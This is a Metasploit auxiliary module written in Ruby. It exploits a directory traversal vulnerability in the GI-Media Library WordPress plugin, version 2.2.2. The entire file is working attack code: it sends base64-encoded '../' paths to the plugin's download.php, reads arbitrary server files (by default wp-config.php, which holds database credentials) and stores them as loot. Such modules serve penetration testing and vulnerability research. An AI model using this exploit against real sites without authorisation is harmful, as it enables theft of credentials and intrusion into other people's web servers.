##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress GI-Media Library Plugin Directory Traversal Vulnerability',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability in WordPress Plugin
        GI-Media Library version 2.2.2, allowing to read arbitrary files from the
        system with the web server privileges. This module has been tested successfully
        on GI-Media Library version 2.2.2 with WordPress 4.1.3 on Ubuntu 12.04 Server.
      },
      'References'     =>
        [
          ['WPVDB', '7754'],
          ['URL', 'http://wordpressa.quantika14.com/repository/index.php?id=24']
        ],
      'Author'         =>
        [
          'Unknown', # Vulnerability discovery - QuantiKa14?
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('FILEPATH', [true, 'The wordpress file to read', 'wp-config.php']),
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the wordpress root folder)', 3 ])
      ])
  end

  def check
    check_plugin_version_from_readme('gi-media-library', '3.0')
  end

  def run_host(ip)
    traversal = '../' * datastore['DEPTH']
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ /^\//

    res = send_request_cgi(
      'method' => 'GET',
      'uri'    => normalize_uri(wordpress_url_plugins, 'gi-media-library', 'download.php'),
      'vars_get' =>
        {
          'fileid' => Rex::Text.encode_base64(traversal + filename)
        }
    )

    if res && res.code == 200 && res.body && res.body.length > 0
      fname = datastore['FILEPATH']

      path = store_loot(
        'gimedia-library.file',
        'text/plain',
        ip,
        res.body,
        fname
      )

      print_good("File saved in: #{path}")
    else
      vprint_error("Nothing was downloaded. Check the path and the traversal parameters.")
    end
  end
end
